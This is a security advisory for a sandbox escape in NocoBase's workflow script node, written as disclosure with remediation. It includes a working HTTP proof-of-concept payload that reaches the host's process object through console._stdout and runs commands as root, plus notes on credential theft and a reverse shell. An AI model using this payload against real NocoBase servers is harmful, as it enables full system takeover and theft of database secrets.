# [C] NocoBase Affected by Sandbox Escape to RCE via console._stdout Prototype Chain Traversal in Workflow Script Node

## Summary
Severity: Critical
Advisory: GHSA-px3p-vgh9-m57c
CVE: CVE-2026-34156
CWE: CWE-913
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-px3p-vgh9-m57c
Type: github-advisory

## Affected
- npm: `@nocobase/plugin-workflow-javascript` — affected >=0 <2.0.28

## Details
`##` Summary

NocoBase's Workflow Script Node executes user-supplied JavaScript inside a Node.js `vm` sandbox with a custom `require` allowlist (controlled by `WORKFLOW_SCRIPT_MODULES` env var). However, the `console` object passed into the sandbox context exposes host-realm `WritableWorkerStdio` stream objects via `console._stdout` and `console._stderr`.

An authenticated attacker can traverse the prototype chain to escape the sandbox and achieve Remote Code Execution (RCE) as root.

## Exploit Chain

1. `console._stdout.constructor.constructor` → host-realm `Function` constructor
2. `Function('return process')()` → Node.js `process` object
3. `process.mainModule.require('child_process')` → unrestricted module loading
4. `child_process.execSync('id')` → RCE as root

This completely bypasses the `customRequire` allowlist.

## Impact

- Remote Code Execution as root (uid=0) inside Docker container
- Database credential theft (`DB_PASSWORD`, `INIT_ROOT_PASSWORD` from `process.env`)
- Arbitrary file read/write via `require('fs')`
- Reverse shell confirmed
- Outbound network access for lateral movement

## Proof of Concept

**HTTP Request:**

POST /api/flow_nodes:test
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "type": "script",
  "config": {
    "content": "const Fn=console._stdout.constructor.constructor;const proc=Fn('return process')();const cp=proc.mainModule.require('child_process');return cp.execSync('id').toString().trim();",
    "timeout": 5000,
    "arguments": []
  }
}

**Response:**

{"data":{"status":1,"result":"uid=0(root) gid=0(root) groups=0(root)","log":""}}

## Environment

- Docker image: `nocobase/nocobase:latest`
- NocoBase CLI: v2.0.26
- Node.js: v20.20.1
- OS: Debian GNU/Linux 12 (bookworm)

## PoC

Got reverse shell

<img width="1300" height="743" alt="Screenshot 2026-03-26 at 06 09 51" src="https://github.com/user-attachments/assets/fcb65346-2d98-485a-a849-153d5957c78e" />

Proof of concept the root privileges

<img width="1292" height="515" alt="Screenshot 2026-03-26 at 06 12 29" src="https://github.com/user-attachments/assets/599cd915-d5e9-47b6-9ddb-655ae4f22d50" />

os-release demonstration

<img width="1290" height="523" alt="Screenshot 2026-03-26 at 06 12 54" src="https://github.com/user-attachments/assets/48030450-f2b1-4edc-a7f0-caafbf55dd00" />

<img width="1296" height="516" alt="image" src="https://github.com/user-attachments/assets/f7012c09-885b-48fb-a6d4-7282c0326d0b" />

App path

<img width="1295" height="516" alt="Screenshot 2026-03-26 at 06 14 04" src="https://github.com/user-attachments/assets/b4846af8-cb10-4c2a-886f-b19a120c2245" />

## Exploit Usage:

Reverse Shell Mode

<img width="1299" height="523" alt="tool1" src="https://github.com/user-attachments/assets/6c26d6f3-0ad2-4a61-9692-b150409ee569" />

Dump system information & creds

<img width="635" height="591" alt="tool2" src="https://github.com/user-attachments/assets/08dbc231-d686-4536-8a74-272ceb5c10a8" />

Remote Command Execution Mode

<img width="644" height="467" alt="tool3" src="https://github.com/user-attachments/assets/fc95d89b-eff5-4eec-87b4-f6022778feec" />



## Remediation

1. Replace Node.js `vm` module with `isolated-vm` for true V8 isolate separation
2. Do not pass the host `console` object into the sandbox; create a clean proxy
3. Run the application as a non-root user inside Docker
4. Restrict `/api/flow_nodes:test` to admin-only roles

## Alternative Escape Vectors

- `console._stderr.constructor.constructor` (identical chain via stderr)
- `Error.prepareStackTrace` + `CallSite.getThis()` (V8 CallSite API)

## Reporter

Onurcan Genç — Independent Security Researcher, Bilkent University

## References
- https://github.com/nocobase/nocobase/security/advisories/GHSA-px3p-vgh9-m57c
- https://nvd.nist.gov/vuln/detail/CVE-2026-34156
- https://github.com/nocobase/nocobase/pull/8967
- https://github.com/nocobase/nocobase
- https://github.com/nocobase/nocobase/releases/tag/v2.0.28
